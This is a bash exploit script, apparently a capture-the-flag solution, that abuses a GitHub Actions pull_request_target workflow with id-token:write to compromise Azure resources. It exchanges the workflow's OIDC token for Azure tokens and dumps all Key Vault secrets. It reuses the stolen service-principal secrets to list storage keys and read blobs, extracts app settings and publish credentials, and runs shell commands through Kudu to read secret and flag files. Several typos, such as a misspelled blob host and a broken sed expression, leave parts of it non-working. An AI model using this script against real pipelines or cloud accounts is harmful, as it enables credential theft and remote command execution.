#!/usr/bin/env bash
# CTF DF26 "Tebamoto Logistics" — pull_request_target + unsafe PR checkout + id-token:write.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
KVV=https://kv-tbl-prod-x3euoz.vault.azure.net
M=https://management.azure.com
API_SA=2023-01-01; API_WEB=2022-03-01
FL='DF26\{[^}]\{0,200\}\}'

OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)

fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
post(){ curl -s -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' "$1"; }

echo "===== CTX run=$GITHUB_RUN_ID tenant=$T client=$C sub=$S ====="

VT=$(fed "$C" "https://vault.azure.net/.default")
echo "===== VAULT token len=${#VT} ====="
SECS=$(curl -s "$KVV/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[].id')

# 1) dump every KV secret value
for u in $SECS; do
  v=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // empty')
  echo "===== KV $(basename "$u") ====="
  echo "$v" | head -c 900; echo
  echo "$v" | grep -aoE "$FL"
done

# 2) every SP cred -> ARM token -> storage keys + appsettings + kudu
for u in $SECS; do
  w=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // empty')
  aid=$(echo "$w" | jq -r '.appId // empty'); as=$(echo "$w" | jq -r '.clientSecret // empty')
  [ -z "$aid" ] && continue; [ -z "$as" ] && continue
  echo "===== SP $(basename "$u") $aid ====="
  ARM=$(spn "$aid" "$as" "https://management.azure.com/.default")
  [ ${#ARM} -lt 50 ] && { echo "no ARM token"; continue; }

  for said in $(curl -s -H "Authorization: Bearer $ARM" \
      "$M/subscriptions/$S/providers/Microsoft.Storage/storageAccounts?api-version=$API_SA" | jq -r '.value[].id // empty'); do
    sa=$(basename "$said")
    KEY=$(post "$said/listKeys?api-version=$API_SA" | jq -r '.keys[0].value // empty')
    echo "-- SA $sa key=${KEY:+yes}${KEY:-no}"
    [ -z "$KEY" ] && continue
    auth(){ local d; d=$(date -u +"%a, %d %b %Y %H:%M:%S GMT"); curl -s "$1" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $d" -H "Authorization: SharedKey $sa:$KEY"; }
    for cont in $(auth "https://$sa.blob.core.windows.net/?comp=list" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
      echo "   CONTAINER $cont"
      for blob in $(auth "https://$sa.blob.core.windowws.net/$cont?restype=container&comp=list" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//'); do
        echo "      BLOB $blob"
        data=$(auth "https://$sa.blob.core.windowws.net/$cont/$blob")
        echo "$data" | head -c 1200; echo
        echo "$data" | grep -aoE "$FL"
      done
    done
  done

  for pair in "rg-tbl-platform-prod-sea app-tbl-storefront-prod" "rg-tbl-reporting-prod-eus app-tbl-reporting-prod" "rg-tbl-platform-prod-sea app-tbl-reporting-prod" "rg-tbl-reporting-prod-eus app-tbl-storefront-prod"; do
    set -- $pair
    cfg=$(post "$M/subscriptions/$S/resourceGroups/$1/providers/Microsoft.Web/sites/$2/config/appsettings/list?api-version=$API_WEB")
    echo "===== APPSTTINGS $2 (via $(basename "$u")) ====="
    echo "$cfg" | head -c 2500; echo
    echo "$cfg" | grep -aoE "$FL"
    px=$(post "$M/subscriptions/$S/resourceGroups/$1/providers/Microsoft.Web/sites/$2/config/publishxml/list?api-version=$API_WEB")
    pu=$(echo "$px" | grep -oE 'userName="[^"]+"' | head -1 | sed 's/userName="//;s/"//')
    pp=$(echo "$px" | grep -oE 'userPwd="[^"]+"' | head -1 | sed 's/userPwd="//s/"//')
    [ -z "$pu" ] && continue
    echo "===== /UDU $2 user=$pu ====="
    for cmd in "env | grep -i df26 ; ls -la /home /home/site 2>/dev/null" "grep -ra DF26 /home 2>/dev/null | cut -c1-220 | head -20" "cat /home/secrets/* /home/flag* /home/site/flag* 2>/dev/null"; do
      echo "--- cmd: $cmd"
      curl -s -m 45 -u "$pu:$pp" -H 'Content-Type: application/json' \
        -d "{\"command\":\"$cmd\",\"dir\":\"/home\"}" \
        "https://$2.scm.azurewebsites.net/api/command" | head -c 2000; echo
    done
  done
done
echo DONE-EXPLOIT

